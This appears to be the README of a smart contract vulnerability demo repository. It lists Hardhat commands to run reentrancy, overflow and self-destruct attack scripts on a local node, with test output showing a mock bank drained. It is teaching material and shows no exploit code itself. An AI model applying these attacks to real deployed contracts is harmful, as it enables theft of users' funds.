# VulnVault
A collection of smart contract vulnerability demos and exploit examples

Before executing each demo, you have to setup the node with the following command.

```bash
npx hardhat node
```

## Reentrancy Attack

```bash
$ cd reentrancy
$ npx hardhat compile
$ npx hardhat run scripts/ReentrancyAttack.js --network localhost
$ npx hardhat test test/ReentrancyAttack.js

  Reentrancy Attack
Bank balance before attack: 10.0
Attacker balance before attack: 10000.0
-------------------------------
Number of times `withdraw` has been called: 11n
Bank balance after attack: 0.0
Attacker balance after attack: 10009.999707416496813617
    ✔ should allow reentrancy attack to drain funds from the bank


  1 passing (540ms)
```

## Overflow Attack

```bash
$ cd overflow
$ npx hardhat compile
$ npx hardhat run scripts/OverflowAttack.js --network localhost
$ npx hardhat test test/OverflowAttack.js

  Overflow Attack
Bank balance before attack: 10.0
Attacker balance before attack: 9989.998708259262918561
-------------------------------
Bank balance after attack: 0.0
Attacker balance after attack: 9999.998604234268539613
    ✔ should allow overflow attack to drain funds from the bank


  1 passing (480ms)
```

## SelfDestruct Attack

```bash
$ cd overflow
$ npx hardhat compile
$ npx hardhat run scripts/SelfDestructAttack.js --network localhost
$ npx hardhat test test/SelfDestructAttack.js

  SelfDestruct Attack
Bank balance before attack: 2.0
Attacker balance before attack: 10000.0
-------------------------------
Bank balance after attack-2: 0.0
Attacker balance after attack: 10001.999854172729825825
    ✔ should allow self-destruct attack to drain funds from the bank


  1 passing (582ms)
```
